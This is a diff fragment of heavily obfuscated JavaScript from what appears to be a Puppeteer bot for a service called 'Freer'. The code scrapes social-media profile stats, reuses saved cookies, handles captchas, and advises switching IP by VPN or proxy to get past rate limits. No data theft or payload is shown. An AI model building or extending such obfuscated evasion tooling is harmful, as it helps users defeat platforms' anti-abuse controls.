-    EScnp: "883bbo0t7p334lcqaH1iee25426BcI5IeC3H8N3B7b10514mbe3femcJ0y3h4G54caafey3y7E7kbD9cfjfa9V9KbEch9A6",
-    gWBPq: "D1K1Efn8Odpeefyc6fS087S1e3p284haUbf1y0e1ifgal9T0T143R7z3e6ube5abb7s3g6Y3Qcg8s4e0M1u0d4x38dAcNf6",
-    ZIDWj: "fa5lbR09egfW7ycX9xas282j3E577sdv7f19bH44ag7Y1UfTbP20573o8c1A6j8D2E1lcy1HeHaPdK2LdmamfXb3byel4Ef",
-    bMRBS: "I1o60ct6R840u4a9O6a4M7G1w4x3cdRcndI757TfJcB6i8Xek2Vfx9H8r2Eff9S6A7a9n5E5U1d6Oe0dq4ma30pfM4Y0Oan",
-    njHYK: "cyeJ8T1f6sfyaw9s0r71cAfx2d5DaFbVc89i2haue09j6f3h4Wdp2X2Z9W5zeD9Y8QfAcg9h0m1rdRai6Qfw75axfL24234",
-    rvKvY: "L88fU3MeJ5v4B0SaTdN3IcO9Kdg8H1RblaY9m823Wbf4V2d0P8o7ZaW3tajbhata17B5k8R577Ec83CacaP68bfcD6LcJ4O",
-    mWdaB: "d25H4F7xdi5Yb37y4N3F8Pdwcicy0D9Obm3pf61V274efz1T3I1Wfw8aeQ4G61446D4d9738cze56t106ta74d0w2W5g381",
-    zFIdF: "Ga32Eeg0776dF1da83e54bsdo3A0FfP2q0p8n0e6Nei287Fddc74H35dh4g2J2rbufD6Zbx7xaL2mdK9vcTcX1Lcydm5k9r",
-    YYnZJ: "elbacNa37D1va36a8o5qcO3tfT7c1O3B05507RcRaG4s1u8gdr4s7MdTeiee785pf3501w7i7c1RcJaS5bbW21dCcP9TbX1",
-    btqwT: "37Q467w8o752032b58a2fbAescP0MaT0e5D742z0z8adY54fP27352J8LdPaH1D1ucbaJ7G4K1r165edE4daR9dbO1PcDf7",
-    isoJt: "499zfx0O1x6TfyeO1x8Sdadwcc5fdM3w6w7beHeicidL4h6VbA2N9MeE4d5WdZ323SaPaIfZ9vdE37be7z0seleN9t0Xcr9",
-    nLJiU: "eeq7Zccd99s3f972r2G827E4x7q1K04eT9rc1f8aj6FdIel3Z9kbTbD1k1DaTbbeU0ybibBeGedf3ff1CdL2l4K4Te22h6U",
-    FNdII: "7J9c57dc4j3K8edX3waWfEcj8bbM5S6Ceh1t1d0u7v0Kcj9g9x4JaecxeI7scuan6c7Vdv8beU1A8n7G5S1D5x7XcL120Gb",
-    bjBtO: "W4O30aEbo9TfoaB0Lca8Z5HfQ0xcEakeyekdf7I8E8M5Rd03k7y7ic041958s2v328Vawfaed3R8u1xfbdy3u3j1db1arcp",
-    OIvEz: "3o5Y2o1r4b1Q19f17r7j23ei2k4nam7ibj3xeq8Dd76o9b2fbt7m8weM0r4vdo4O5KekdF25bJ9A6505bAfdbw6vbo51bG7",
-    mwpJg: "bbZ7K7c8Yfn9B7T7p5t116s2S0e9Vbh7f46dq8w8P3sccba9u8Oed0U6k678M9V7Z6A5a676scK1Zdpbmc3bldF76fp2mdm",
-    jOpzI: "7ucA4Q1h2R72ek3ycV0H1q0V3D7u6M3O47cA4m8Ddm2VfK158MaP395RdA936e285o0b1hf0eK9m602w6Oaw4Dcb9yaC4w3",
-    aQzzY: "l2n4adEbedw55cK1l985b985T58freQeIaL7b1RcZ437Ud72U5DeuarcC0k7K52ad760d0O7Z8Bapckdo4Daqd8bZeI1V3f",
-    JkNoo: "665N6SbW9c3XcC9R6q133G6ObzaEfQfc6d4zaw9i6McI8Kar2mdN1e2Uem2t4x9m1KbufwdIbe570M6VcS7l0z5Hfh9w851",
-    StXIv: "EaX1L3l0Sfwdq7c8e473Yag8z35dycxfc9vbB1LbMbjbo3nau480Scv37ak6i65by4j2i0yet9Q9hc95bbsfz3UeU0e4SbG",
-    MUvKK: "0W6WdI3U1E8Q5Abqbn7dfA5G5i9x289Ha6400Wep322p5A5P8i2E2bft73dedq4x1X0Ze99l6E152O3WcrdVbn8Rc7d87S0",
-    gEbdV: "Z628cds9Pev2W8xbt95f78T3F2pd89I2paHa25G9Q231J8c7Wfee30fbS3i2sfL1w5G8c5M4T8Z297RcScteR9f633y215e",
-    FjNqH: "9N3O6R2C1Sc18i7qbNdx678N9H7p5b5paz6Q8kbG0T9w0q7235aF1O7O1Q4rcS6Z5Bfeatfb19fHdo1VaN9u67ds6ZfBcl6",
-    UOACt: "O7DcDdB5g4kbj3O2laJaP9f863Tfm6hfJ4udAfa882cbH1OcU4fb6173g4sa6c9c0cH2S7H2PfhdV3vb7fr360k8W39fI0l",
-    BntOG: "bA0xaH8Kat956ac18y3Yec88eH1d829x5h1ubV9f693Y0MdW0A7K0QcS5G5SdK8B2sa9fD8K0N0rax0l04cr5r6e6A0LeM2",
-    kwdaz: "i6tfi3s9m9h1ibm8o7S0jbt7C0T2Vel95322e2A9s7G6CfmdZdkfPdIal1G4s6k5l0VeJ0G8JcCaZd07gd35H8oeU2edBcb",
-    kRSrX: "2n0K28283Val3oar4T8B7W6X4N33dR2eaodB4o3G2m564T0kdfaeabfR6U0T3w5Ge82M50dffL2g7wdOdG9o4Y7V0g4m1Ve",
-    QRzRo: "3dv9F9d6A7X467w34cXeJ905h0h1G500BfL0I2DeOb18KaBegaZ6qdo5V0Ge6ez1Mex2SeD9p3Gb72k1w3XaM8TaQc80kcW",
-    smyDj: "2M7V4Ief1FfHeC4n9Df5365Ia0dZ0Z49bw0l2L5Y3J85fR7z5b2m9m4g71dMbY2T9u2BfhcK1O4D5f3pdl1O4Xeob3cI7cf",
-    bINPd: "p3a9J01bhd2bZ5u1o1n3W3a5Heg4garb60heP2H0m9G2cfh0F0gbc1Zb98Vfff1f40q36eF8C9Ofj5J6C450vaaa45W3DbD",
-    gzlOx: "6Md7950t9kcj4eejfw3ebkeybj7HcK3735bR3XcF3M1P4X5d9k3y1Wbi6Qfe4m5K194o1h1u0g0n5OcW1t2XdC77at6Gdfb",
-    rNMCA: "u9B9m9iezbu1s3Bb41w42a7eKeofp8R9SfL9yf977dx9ja70l8g8nbEeL8E8J8Wf813bv2zaR34424AeObz8bc19QbL9i9H",
-    XajrI: "8wbc7H9rfA5JfPf6eEdtcJ6ibhcJ4LdQcw5k6O6Se44k0a0QaHdm0002ee7R5V7W593xeX9PcV2f9x1VewdCfTbEdPamdRa",
-    fQLOA: "q2weS33dhfT1ha17ydk4tfnc20S7katdE4KaZbA9W7bbu1c3m6p8k5jdpbG0ffT6Bfm3J14cl9rec5F4E5D3D0z7U9y3rbv",
-    NClah: "debAfzdC1P5K5V2Qdo0s9K5f9ccAb59T2Sf76LdJbNdl6GbwbneTdH7C4j8A9N7C3B4G9Kac048E461Y29949FcY6O1Kab6",
-    nVvrU: "j9w3f513e5B6ke53s7yev5v4ffX1i2d7u9Jbi5R2s4rfs8zdG5G5U0s6A6wbZ4B8Yau3P4afn8q2y0R4r1K8L9feb374kd6",
-    xWtRM: "etcf30aJ5se973aK9A9b7C4BcU8r6v8g986m2ycf4s4M1yaY1sc05104dP6a3ffZ3X4Za587fXeK8J076rb7aI2N6gc683c",
-    BcoON: "AbN7l1Q3oeyel181h527i9X0q4c48973f9H04an2W9M663n7T0sf83O4k8r5y65fQ397X383D8L4fdqbp6A3R6netdO1g6O",
-    dvaHK: "9Y6UdJ3q3Gei9X97de2X6EewcD8b5Z9Dai6zc47hfUbFbx3F5u3gfs0ya12A6fcUcUdvbq91eM898Fe0eW5x01fGfham7N5",
-    ekHTa: "t24fg616idOfY7udH0848co3W2PfC0p6JasdK5L3reWfw952g5Oce9K5Q6Aay265B3Lf55q4e5Ucw8D4Peofr3lbNfH85ec",
-    YAMGY: "7PbEcl4Rcgea2YaL2l7y0Vek4n8Nb8fC6JdF3VaNcn0y5Z0w5B4Vad8sce397udZ0RbVe8cN9gau8Kdg2Med5l7h5hfR4Z5",
-    exoUa: "55l6i3q6t7P1t4xafbG5l0a153Bf45EendV9g661M5y5P8KdScTad7OeO8PaX4s7deyaq914W6U6d8d509mes8jcr916hfX",
-    zhKzK: "9Ffm1p0Q4w9Yfn7d9mdn3R4KcFey1ecLcYaWch0k4y2rdT5oby1J7naZb74DbR9u2z521r4Wdg9L5Q4e9dch8F2Zeg6X157",
-    MNrId: "6bCcWbX72c34y1dbF6U2c6p6T82erdj9PeqfR877A5Eci6I7c35cN768abN9E1Z8F0j181z2n6j7j0c4l6I5b3e14eM4P5W",
-    SjEob: "9U9n0Xc34zcb28938Ne16T152b0M1rfhc644f41Gey650dcD9EaY6geD5S9EbrdIad8sdrfO0ieLehfh5qbE7T9ffb169ve",
-    AWfHc: "d5w5o5v3R0gcFbi6f951U8y6i9X4r8x4b2y4Zdgcibb8kaff8dd1F88eQbufNaS640A5Y9I9bfB9Pelbgdr2Ofc8s8Z5Z7Z",
-    Iciww: "1X9V5kdgdc5f9U9Ueh004t4gdw8Se8aTea1d8Y9y9k8R8Q9R5zbRbd6z70738jfv31eY294C4Mdm085k9q3Z0Ffa0s7i3d6",
-    YzPer: "C6gdZeebQ7L1Jao6G0R1V1x1betfbdD5f4N0m0D0I6K8X8E7Xex0LeDcFcI9K2GdCdg5u4K78392D2m5J4PddfLcAat3a6m",
-    KDipt: "629a32dWc36gfB2b3WdU3Iawb61i6r4Xcc9s6s951M3pchc3e1fY4A2bfB4T5Z2K2R57651F4R3v2r7c53fd55ar8Q7u6V2",
-    cARrp: "1bO0R8D8vcv2d8i3Ya4bjap307W1v3ecw9Db7bw7kff5C0K6KeA6Z3D5PfY2A4S7Nbk9abnaG9X2n17enbabD356Aeqba0E",
-    NIBYy: "47fr4V7K0G9e9h206Z2oaB6YfcasbWad167f7ndn8S7Z6z6N3T1zdv5535bi2H2Cejc846dU4V1T3aacdu9n1W8hdEd6aHa",
-    aJSwO: "Fa29H0TbA8Pek86d7c06Add0M0Y7v3z9H9e8dbHeVdfbh6veads989NbW4j0r1Rab4w1rcxbV8R2E3Q371UdTbUey8a4x73",
-    JPgqP: "aX3BeDaN6I3R192K6X5H4E6Wbr0WbU1B2h0zdc3g3F5jen4b95cHfv4W0x4Wdk769EeC6p5W41174CaL31bY8cds4z8l9Xe",
-    bVudI: "Vf5bUcsb1293K82bLdJ0cfN5Zdyeu2N148ja09D83ea0C8o9ods8AcXbk3kfm4Efe685P98838kd61Q5L2eaR5rbIfj532u",
-    wHPGI: "dgfy5n49bc5W5dbafO7y9beNbh912T0reV028X1o2jdOaa7abJa47L4Ab45c7ubNbX8z3U0V0ddI8Gc25Seif45dafaD3r0",
-    dOlWZ: "Zce1za5f6bX8D1HbH069Tar5Tax570beu0E",
-    ClwLL: function (p1529, p1530) {
-      return p1529(p1530);
-    },
-    FSjxq: function (p1531, p1532) {
-      return p1531 > p1532;
-    },
-    cIzfJ: function (p1533, p1534) {
-      return p1533 === p1534;
-    },
-    pIjMr: "WdHKy",
-    sPwKv: "LJrTT",
-    WRuYL: function (p1535, p1536) {
-      return p1535 === p1536;
-    },
-    twpKk: "UwGdY",
-    LZCwN: function (p1537, p1538) {
-      return p1537(p1538);
-    },
-    llKVX: function (p1539, p1540) {
-      return p1539(p1540);
-    },
-    ICuwn: function (p1541, p1542) {
-      return p1541 === p1542;
-    },
-    kZCcr: "xAjMS",
-    pkSEU: "ijino",
-    TIWUB: function (p1543, p1544) {
-      return p1543 === p1544;
-    },
-    BbbUF: "VyBJu",
-    PEoJZ: "vUcUw",
-    xRvDn: function (p1545, p1546) {
-      return p1545(p1546);
+    mdimm: function (p1593, p1594) {
+      return p1593 > p1594;
     }
   };
   try {
-    if (v494.cIzfJ(v494.pIjMr, v494.pIjMr)) {
-      const v495 = v494.ClwLL(a0zN, p1454);
-      if (!v495.ok) {
-        if (v494.cIzfJ(v494.sPwKv, v494.sPwKv)) {
-          return null;
-        } else {
-          N.stdout.clearLine(0);
-          C.stdout.cursorTo(0);
-          S.stdout.write(t + " Captcha resolved! (" + V + ")");
-        }
-      }
-      const v496 = v495.text();
-      const v497 = v496.match(/"stats":\s*{\s*"followerCount":(\d+),\s*"followingCount":(\d+),\s*"heart":(\d+),\s*"heartCount":(\d+),\s*"videoCount":(\d+),\s*"diggCount":(\d+),\s*"friendCount":(\d+)\s*}/);
-      if (v497) {
-        if (v494.WRuYL(v494.twpKk, v494.twpKk)) {
-          const [, v498, v499, v500, v501, v502, v503, v504] = v497;
-          return {
-            followerCount: v494.LZCwN(parseInt, v498),
-            followingCount: v494.ClwLL(parseInt, v499),
-            heart: v494.LZCwN(parseInt, v500),
-            heartCount: v494.ClwLL(parseInt, v501),
-            videoCount: v494.LZCwN(parseInt, v502),
-            diggCount: v494.llKVX(parseInt, v503),
-            friendCount: v494.llKVX(parseInt, v504)
-          };
-        } else {
-          v496 = v494.ecCFw(v497, N);
-        }
-      } else if (v494.ICuwn(v494.kZCcr, v494.pkSEU)) {
-        return v494.GCWcP(v494.GCWcP(v494.GCWcP(v494.GCWcP(v494.qwMMj(v494.GCWcP(v494.GCWcP(v494.rJWRn(v494.qwMMj(v494.GCWcP(v494.GCWcP(v494.rJWRn(v494.GCWcP(v494.qwMMj(v494.dhOXH(v494.JfZkt(v494.Swdce(v494.GCWcP(v494.TgZbD(v494.rJWRn(v494.Swdce(v494.FvwBV(v494.TgZbD(v494.JfZkt(v494.rJWRn(v494.JfZkt(v494.VCmBB(v494.OnFhe(v494.OnFhe(v494.ipdXh(v494.TgZbD(v494.OnFhe(v494.GCWcP(v494.pjXaU(v494.IpxNA(v494.ipdXh(v494.pjXaU(v494.YgGAE(v494.TgZbD(v494.LQJIh(v494.YgGAE(v494.vYxCs(v494.LQJIh(v494.VCmBB(v494.JfZkt(v494.LQJIh(v494.ygPiY(v494.mdQIG(v494.HGsmk(v494.vYxCs(v494.gKick(v494.tSbBy(v494.dhOXH(v494.EHtlh(v494.jOrfu(v494.ipdXh(v494.dhOXH(v494.GCWcP(v494.EHtlh(v494.LQJIh(v494.YgGAE(v494.gKick(v494.QIHTG(v494.ipdXh(v494.ipdXh(v494.jOrfu(v494.tSbBy(v494.JPsXz(v494.EDIOa(v494.AOXLM(v494.oBuKI(v494.tSvTg(v494.jMpQo(v494.ZGUBk(v494.rJWRn(v494.GCWcP(v494.JPsXz(v494.oBuKI(v494.YBwSr(v494.htZlM(v494.YgGAE(v494.JPsXz(v494.VwWJR(v494.mdQIG(v494.htZlM(v494.Neqis(v494.fnlcN(v494.VwWJR(v494.bQSif, v494.LmvgJ), v494.zcWdu), v494.IqhFv), v494.LGejQ), v494.fACKo), v494.tIkWk), v494.wBvqe), v494.JbEGq), v494.JAvMd), v494.iRCCV), v494.lcnqT), v494.rWroQ), v494.WIxKR), v494.CWBIc), v494.Gurrv), v494.YtFvi), v494.KXqbL), v494.ZyCqg), v494.WWmrf), v494.CKQIP), v494.BnmuB), v494.oqtpu), v494.dnBiF), v494.qYXwR), v494.GbiUO), v494.spVRR), v494.FUwmJ), v494.zQNZr), v494.dbIlJ), v494.Gbmwv), v494.YlgZq), v494.vOhSL), v494.EScnp), v494.gWBPq), v494.ZIDWj), v494.bMRBS), v494.njHYK), v494.rvKvY), v494.mWdaB), v494.zFIdF), v494.YYnZJ), v494.btqwT), v494.isoJt), v494.nLJiU), v494.FNdII), v494.bjBtO), v494.OIvEz), v494.mwpJg), v494.jOpzI), v494.aQzzY), v494.JkNoo), v494.StXIv), v494.MUvKK), v494.gEbdV), v494.FjNqH), v494.UOACt), v494.BntOG), v494.kwdaz), v494.kRSrX), v494.QRzRo), v494.smyDj), v494.bINPd), v494.gzlOx), v494.rNMCA), v494.XajrI), v494.fQLOA), v494.NClah), v494.nVvrU), v494.xWtRM), v494.BcoON), v494.dvaHK), v494.ekHTa), v494.YAMGY), v494.exoUa), v494.zhKzK), v494.MNrId), v494.SjEob), v494.AWfHc), v494.Iciww), v494.YzPer), v494.KDipt), v494.cARrp), v494.NIBYy), v494.aJSwO), v494.JPgqP), v494.bVudI), v494.wHPGI), v494.dOlWZ);
-      } else {
-        return null;
-      }
+    const v525 = v524.gUuHO(a0ia, v524.aLINX(v48, p1588));
+    const v526 = v525.json();
+    if (v524.mdimm(v526.length, 0)) {
+      return v526[0].word;
     } else {
-      ICXebd.ClwLL(v494, "0");
+      return p1588;
     }
-  } catch (F) {
-    if (v494.TIWUB(v494.BbbUF, v494.PEoJZ)) {
-      const v505 = v494.ClwLL(d, v494.qwMMj(N, C));
-      const v506 = v505.json();
-      if (v494.FSjxq(v506.length, 0)) {
-        return v506[0].word;
-      } else {
-        return t;
-      }
-    } else {
-      v494.xRvDn(f53, F);
-      return null;
-    }
+  } catch (c) {
+    v524.gUuHO(f54, c);
+    return p1588;
   }
 }
-async function f61(p1547) {
-  const v507 = {
-    GmyrL: function (p1548, p1549) {
-      return p1548(p1549);
+async function f63(p1595) {
+  const v527 = {
+    zEocL: function (p1596, p1597) {
+      return p1596(p1597);
     },
-    gOMIH: function (p1550, p1551) {
-      return p1550 + p1551;
-    },
-    zoYxs: function (p1552, p1553) {
-      return p1552 > p1553;
-    },
-    tUFdi: function (p1554, p1555) {
-      return p1554(p1555);
+    oEzKS: function (p1598, p1599, p1600) {
+      return p1598(p1599, p1600);
     }
   };
+  const v528 = v527.zEocL(promisify, a0ic.access);
   try {
-    const v508 = v507.GmyrL(a0zN, v507.gOMIH(v50, p1547));
-    const v509 = v508.json();
-    if (v507.zoYxs(v509.length, 0)) {
-      return v509[0].word;
-    } else {
-      return p1547;
-    }
-  } catch (d) {
-    v507.tUFdi(f53, d);
-    return p1547;
-  }
-}
-async function f62(p1556) {
-  const v510 = {
-    wPAgs: function (p1557, p1558) {
-      return p1557(p1558);
-    },
-    EMEAw: function (p1559, p1560, p1561) {
-      return p1559(p1560, p1561);
-    }
-  };
-  const v511 = v510.wPAgs(promisify, a0zd.access);
-  try {
-    await v510.EMEAw(v511, p1556, a0zd.constants.X_OK);
+    await v527.oEzKS(v528, p1595, a0ic.constants.X_OK);
     return true;
   } catch {
     return false;
   }
 }
-async function f63(p1562 = true, p1563 = null) {
-  const v512 = {
-    epCyr: "Freer",
-    PLvIF: function (p1564, p1565) {
-      return p1564 === p1565;
+async function f64(p1601 = true, p1602 = null) {
+  const v529 = {
+    RdykJ: "Freer",
+    qQkAJ: function (p1603, p1604) {
+      return p1603 === p1604;
     },
-    sglxw: "cookies.json",
-    xPrss: function (p1566, p1567) {
-      return p1566 === p1567;
+    RFefj: "cookies.json",
+    tFicX: function (p1605, p1606) {
+      return p1605 === p1606;
     },
-    qsjMH: "cookies2.json",
-    FVVPV: function (p1568) {
-      return p1568();
+    byhzx: "cookies2.json",
+    hixkU: function (p1607) {
+      return p1607();
     },
-    wfuUn: function (p1569, p1570) {
-      return p1569(p1570);
+    GcvXL: function (p1608, p1609) {
+      return p1608(p1609);
     },
-    mLnct: "Back",
-    noFIM: function (p1571) {
-      return p1571();
+    xbcZb: function (p1610, p1611) {
+      return p1610 === p1611;
     },
-    uUpRb: function (p1572) {
-      return p1572();
+    nZOap: "Back",
+    VkLsU: function (p1612) {
+      return p1612();
     },
-    QUFhl: function (p1573, p1574, p1575, p1576) {
-      return p1573(p1574, p1575, p1576);
+    LVmgP: function (p1613, p1614) {
+      return p1613(p1614);
+    },
+    aFKyU: function (p1615, p1616) {
+      return p1615(p1616);
+    },
+    bLrHY: function (p1617, p1618, p1619, p1620) {
+      return p1617(p1618, p1619, p1620);
     }
   };
-  v92 = v39;
-  vA0zS.provider = v512.epCyr;
-  v90 = vA0zS.provider;
-  v93 = v512.PLvIF(vA0zS.cookies, v512.sglxw) && v512.xPrss(vA0zS.provider, v512.epCyr) ? v512.qsjMH : vA0zS.cookies;
-  if (!p1563) {
-    p1563 = await v512.FVVPV(f64);
+  v92 = v37;
+  vA0iw.provider = v529.RdykJ;
+  v90 = vA0iw.provider;
+  v93 = v529.qQkAJ(vA0iw.cookies, v529.RFefj) && v529.tFicX(vA0iw.provider, v529.RdykJ) ? v529.byhzx : vA0iw.cookies;
+  if (!p1602) {
+    p1602 = await v529.hixkU(f65);
   }
-  let v513 = await v512.wfuUn(f69, p1563);
-  if (v512.PLvIF(v513, v512.mLnct)) {
-    if (!v26) {
+  let v530 = await v529.GcvXL(f70, p1602);
+  if (v529.xbcZb(v530, v529.nZOap)) {
+    if (!v28) {
       process.stdout.moveCursor(0, -2);
       process.stdout.clearScreenDown();
     }
-    await v512.noFIM(f3);
-    await v512.uUpRb(f2);
+    await v529.hixkU(f3);
+    await v529.VkLsU(f2);
     return;
   }
-  if (!v513) {
-    await v512.wfuUn(f63, false);
+  if (!v530) {
+    await v529.LVmgP(f64, false);
     return;
   }
-  const v514 = await v512.wfuUn(f18, p1563);
-  await v512.QUFhl(f70, v513, v514, p1563);
+  const v531 = await v529.aFKyU(f18, p1602);
+  await v529.bLrHY(f71, v530, v531, p1602);
   return;
 }
-async function f64(p1577 = null) {
-  const v515 = {
-    IcIsi: function (p1578, p1579) {
-      return p1578(p1579);
+async function f65(p1621 = null) {
+  const v532 = {
+    NnuTg: function (p1622, p1623) {
+      return p1622(p1623);
     },
-    PdoeU: "2|0|8|5|7|6|4|10|3|9|1",
-    IYVnL: function (p1580, p1581) {
-      return p1580 && p1581;
+    wjDgk: function (p1624, p1625) {
+      return p1624(p1625);
     },
-    XltJz: function (p1582) {
-      return p1582();
+    BPuka: "2|8|10|0|6|1|7|5|3|4|9",
+    viNNe: function (p1626, p1627) {
+      return p1626(p1627);
     },
-    uPvQm: function (p1583, p1584) {
-      return p1583(p1584);
+    mbZSS: function (p1628, p1629) {
+      return p1628 && p1629;
     },
-    yDYYM: "4|8|7|9|10|2|6|3|1|5|0",
-    FxaDG: function (p1585) {
-      return p1585();
+    MJeXj: function (p1630) {
+      return p1630();
     },
-    keIzx: function (p1586, p1587) {
-      return p1586(p1587);
+    KzhoV: "9|0|4|5|6|1|3|8|10|7|2",
+    lWIJt: function (p1631) {
+      return p1631();
     },
-    KhuuX: function (p1588, p1589) {
-      return p1588 === p1589;
+    rZkdy: function (p1632, p1633) {
+      return p1632 === p1633;
     },
-    TjOrF: "terminal-captcha",
-    KvBFA: function (p1590) {
-      return p1590();
+    ZQRVU: "terminal-captcha",
+    HnZSB: function (p1634, p1635) {
+      return p1634(p1635);
+    },
+    WaBib: function (p1636, p1637) {
+      return p1636(p1637);
+    },
+    NVedy: function (p1638, p1639) {
+      return p1638(p1639);
+    },
+    omMZv: function (p1640) {
+      return p1640();
+    },
+    TLcWx: function (p1641, p1642) {
+      return p1641(p1642);
     }
   };
   try {
-    if (!a0zd.existsSync(v93)) {
-      if (!v79) {
-        v79 = await v515.IcIsi(f37, v28);
+    if (!a0ic.existsSync(v93)) {
+      if (!v77) {
+        v77 = await v532.NnuTg(f38, v30);
       }
-      p1577 = (await v79.pages())[0];
-      await p1577.goto(v92, {
+      p1621 = (await v77.pages())[0];
+      await p1621.goto(v92, {
         timeout: 0
       });
-      await v515.IcIsi(f52, 3000);
-      const v517 = await p1577.evaluate("(() => {\n          return document.querySelector(\"i.fa.fa-solid.fa-hand.fa-5x\") ? 1 : 0;\n        })();");
-      if (v517) {
-        const v518 = v515.PdoeU.split("|");
-        let v519 = 0;
+      await v532.wjDgk(f53, 3000);
+      const v534 = await p1621.evaluate("(() => {\n          return document.querySelector(\"i.fa.fa-solid.fa-hand.fa-5x\") ? 1 : 0;\n        })();");
+      if (v534) {
+        const v535 = v532.BPuka.split("|");
+        let v536 = 0;
         while (true) {
-          switch (v518[v519++]) {
+          switch (v535[v536++]) {
             case "0":
-              v515.IcIsi(f53, "The captcha is blocked and cannot be accessed!");
+              await v532.viNNe(f53, 4000);
               continue;
             case "1":
-              return;
+              process.stdout.clearScreenDown();
+              continue;
             case "2":
-              if (v515.IYVnL(!v26, !v29)) {
+              if (v532.mbZSS(!v28, !v31)) {
                 process.stdout.clearLine(0);
                 process.stdout.cursorTo(0);
-                process.stdout.write(v62 + " The captcha is blocked and cannot be accessed!");
+                process.stdout.write(v60 + " The captcha is blocked and cannot be accessed!");
               }
               continue;
             case "3":
-              await v515.XltJz(f3);
+              await v532.MJeXj(f3);
               continue;
             case "4":
-              process.stdout.clearLine(0);
+              await v532.MJeXj(f2);
               continue;
             case "5":
-              await v515.uPvQm(f52, 4000);
+              process.stdout.cursorTo(0);
               continue;
             case "6":
-              process.stdout.clearScreenDown();
+              process.stdout.moveCursor(0, -3);
               continue;
             case "7":
-              process.stdout.moveCursor(0, -2);
+              process.stdout.clearLine(0);
               continue;
             case "8":
-              console.log("\nTry again later or change your IP with a VPN or Proxy.");
+              v532.NnuTg(f54, "The captcha is blocked and cannot be accessed!");
               continue;
             case "9":
-              await v515.XltJz(f2);
-              continue;
+              return;
             case "10":
-              process.stdout.cursorTo(0);
+              console.log("\nTry again later or change your IP with a VPN or Proxy.");
               continue;
           }
           break;
         }
       }
-      const v520 = await p1577.content();
-      if (/You are being rate limited/.test(v520)) {
-        const v521 = v515.yDYYM.split("|");
-        let v522 = 0;
+      const v537 = await p1621.content();
+      if (/You are being rate limited/.test(v537)) {
+        const v538 = v532.KzhoV.split("|");
+        let v539 = 0;
         while (true) {
-          switch (v521[v522++]) {
+          switch (v538[v539++]) {
             case "0":
-              return;
-            case "1":
-              await v515.XltJz(f3);
+              v532.wjDgk(f54, "You are being rate limited by Freer!");
               continue;
-            case "2":
+            case "1":
               process.stdout.clearScreenDown();
               continue;
+            case "2":
+              return;
             case "3":
-              process.stdout.cursorTo(0);
-              continue;
-            case "4":
-              if (v515.IYVnL(!v26, !v29)) {
-                process.stdout.clearLine(0);
-                process.stdout.cursorTo(0);
-                process.stdout.write(v62 + " You are being rate limited by Freer!");
-              }
-              continue;
-            case "5":
-              await v515.FxaDG(f2);
-              continue;
-            case "6":
               process.stdout.clearLine(0);
               continue;
-            case "7":
+            case "4":
               console.log("\nTry again later or change your IP with a VPN or Proxy.");
               continue;
+            case "5":
+              await v532.viNNe(f53, 4000);
+              continue;
+            case "6":
+              process.stdout.moveCursor(0, -2);
+              continue;
+            case "7":
+              await v532.lWIJt(f2);
+              continue;
             case "8":
-              v515.keIzx(f53, "You are being rate limited by Freer!");
+              process.stdout.cursorTo(0);
               continue;
             case "9":
-              await v515.IcIsi(f52, 4000);
+              if (v532.mbZSS(!v28, !v31)) {
+                process.stdout.clearLine(0);
+                process.stdout.cursorTo(0);
+                process.stdout.write(v60 + " You are being rate limited by Freer!");
+              }
               continue;
             case "10":
-              process.stdout.moveCursor(0, -2);
+              await v532.lWIJt(f3);
               continue;
           }
           break;
         }
       }
-      if (v515.KhuuX(vA0zS[v515.TjOrF], "")) {
-        await v515.IcIsi(f66, p1577);
+      if (v532.rZkdy(vA0iw[v532.ZQRVU], "")) {
+        await v532.HnZSB(f67, p1621);
       } else {
-        await v515.IcIsi(f67, p1577);
+        await v532.WaBib(f68, p1621);
       }
     }
-    if (!p1577) {
-      if (v79) {
-        p1577 = (await v79.pages())[0];
+    if (!p1621) {
+      if (v77) {
+        p1621 = (await v77.pages())[0];
       } else {
-        v79 = await v515.uPvQm(f37, v28);
-        p1577 = (await v79.pages())[0];
+        v77 = await v532.NVedy(f38, v30);
+        p1621 = (await v77.pages())[0];
       }
-      await p1577.goto(v92, {
+      await p1621.goto(v92, {
         timeout: 0
       });
     }
-    return await v515.uPvQm(f65, p1577);
-  } catch (B) {
-    await v515.FxaDG(f30);
-    v79 = null;
-    await v515.keIzx(f52, 300);
-    return await v515.KvBFA(f64);
+    return await v532.viNNe(f66, p1621);
+  } catch (D) {
+    await v532.omMZv(f31);
+    v77 = null;
+    await v532.TLcWx(f53, 1000);
+    return await v532.omMZv(f65);
   }
 }
-async function f65(p1591) {
-  const v524 = {
-    zUzbK: function (p1592, p1593) {
-      return p1592 && p1593;
+async function f66(p1643) {
+  const v541 = {
+    LabWn: function (p1644, p1645) {
+      return p1644 && p1645;
     },
-    pVDeY: function (p1594, p1595) {
-      return p1594(p1595);
+    aKbyf: function (p1646, p1647) {
+      return p1646(p1647);
     },
-    OAcqG: function (p1596, p1597) {
-      return p1596(p1597);
+    PBxkO: function (p1648) {
+      return p1648();
     },
-    EDXHu: function (p1598) {
-      return p1598();
+    Uvbfd: function (p1649, p1650) {
+      return p1649 && p1650;
     },
-    cdcDY: function (p1599, p1600) {
-      return p1599(p1600);
+    FdoSe: function (p1651, p1652) {
+      return p1651(p1652);
     },
-    cLafn: "1|10|6|3|0|2|4|7|8|9|5",
-    xQsUx: function (p1601, p1602) {
-      return p1601(p1602);
+    IYKhN: function (p1653, p1654) {
+      return p1653(p1654);
     },
-    TBKIm: function (p1603) {
-      return p1603();
+    qIBLr: function (p1655, p1656) {
+      return p1655 && p1656;
     },
-    weDiG: function (p1604) {
-      return p1604();
+    OkXOy: function (p1657, p1658) {
+      return p1657(p1658);
     },
-    RMPAt: function (p1605, p1606) {
-      return p1605(p1606);
+    zESWa: function (p1659, p1660) {
+      return p1659(p1660);
     },
-    NpMcw: "0|9|2|7|3|6|1|8|10|5|4",
-    qNMsA: function (p1607, p1608) {
-      return p1607 && p1608;
+    hsjIA: function (p1661, p1662) {
+      return p1661(p1662);
     },
-    SKOJs: function (p1609) {
-      return p1609();
+    deDbw: "3|7|6|10|1|8|2|5|9|4|0",
+    XnKOc: function (p1663, p1664) {
+      return p1663 && p1664;
     },
-    teKZT: function (p1610) {
-      return p1610();
+    aumEL: function (p1665) {
+      return p1665();
     },
-    xHzGP: function (p1611, p1612) {
-      return p1611 === p1612;
+    ppcQx: function (p1666) {
+      return p1666();
     },
-    HovVT: "terminal-captcha",
-    KDQCD: function (p1613, p1614) {
-      return p1613(p1614);
+    NzzDk: function (p1667, p1668) {
+      return p1667(p1668);
+    },
+    mrCDh: "7|10|6|9|1|2|4|5|3|0|8",
+    zQFRH: function (p1669) {
